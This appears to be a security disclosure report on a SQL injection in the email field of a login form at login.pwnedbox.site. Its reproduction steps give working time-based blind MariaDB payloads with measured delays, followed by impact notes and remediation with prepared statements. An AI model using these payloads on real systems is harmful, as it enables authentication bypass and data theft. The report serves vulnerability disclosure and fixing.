## Title
SQL Injection – POST Parameter (`email`) on Login Form at `login.pwnedbox.site`

## Description
**Affected URL:** https://login.pwnedbox.site/
A SQL Injection vulnerability exists in the `email` POST parameter of the login form at `https://login.pwnedbox.site/index.php?view=login`. The application (movieXchange – Film Distribution & Cinema POS) passes the email input directly into a MariaDB query without sanitization, enabling both error-based and time-based blind SQL injection.

**Affected Parameter:** `email` (POST body)  
**Method:** POST  
**Backend Database:** MariaDB  
**Server Stack:** LAMPP  
**Vulnerable File:** `/opt/lampp/htdocs/subdomains/login/index.php`

## Steps to Reproduce
1. Navigate to `https://login.pwnedbox.site/index.php?view=login`.
2. Enter a single quote in the email field to trigger an error:
   ```
   Email: test@gmail.com'
   Password: anything
   ```
   → Application throws a fatal SQL error leaking DB type, server path, and line number.

3. Inject a time-based payload via Burp Repeater in the `email` parameter:
   ```
   action=login&email=1'XOR(94102*if(now()=sysdate(),sleep(5),0))XOR'Z&password=anything
   ```
   → Response delayed by ~5 seconds confirming blind SQLi.

4. Confirm with 10-second sleep via Burp Intruder:
   ```
   email=1'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
   ```
   → Response time: **10,408 ms** (10-second delay confirmed).

5. Confirm arithmetic execution with multiplied sleep:
   ```
   email='XOR(if(now()=sysdate(),sleep(5*5),0))OR'
   ```
   → Request timed out (25-second sleep confirmed).

## POC (Proof of Concept)
<img width="1918" height="1027" alt="a" src="https://github.com/user-attachments/assets/867ecff8-3604-40a1-8d57-2589a55dc84f" />
<img width="1918" height="1025" alt="b" src="https://github.com/user-attachments/assets/18fe85a3-0ad2-44d7-8d4b-ed885ed43776" />
<img width="1901" height="1026" alt="c" src="https://github.com/user-attachments/assets/913f6e04-2a75-4b28-95ff-bfa01aca4417" />
<img width="1918" height="1028" alt="d" src="https://github.com/user-attachments/assets/991bc6b7-ca66-477e-9248-acb0a478eba6" />


## Impact
- **Authentication Bypass** – Login query can be manipulated to authenticate as any user, including admin accounts, without valid credentials.
- **Data Exfiltration** – Full database contents (user credentials, PII, film/distribution records) can be extracted via blind techniques.
- **Credential Theft** – Hashed or plaintext passwords from the users table can be dumped and cracked offline.
- **Verbose Error Disclosure** – Stack trace exposes internal server paths, aiding further exploitation.

## Remediation
1. **Use Prepared Statements** – Parameterize all queries; never concatenate user input.
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
   $stmt->execute([$_POST['email']]);
   ```

2. **Validate Input** – Enforce strict email format validation server-side before it reaches the query.

3. **Suppress Error Messages** – Set `display_errors = Off` in `php.ini` to prevent stack trace leakage in production.

4. **Least Privilege DB User** – Application DB account should only hold `SELECT/INSERT/UPDATE/DELETE` — no `FILE` or admin privileges.
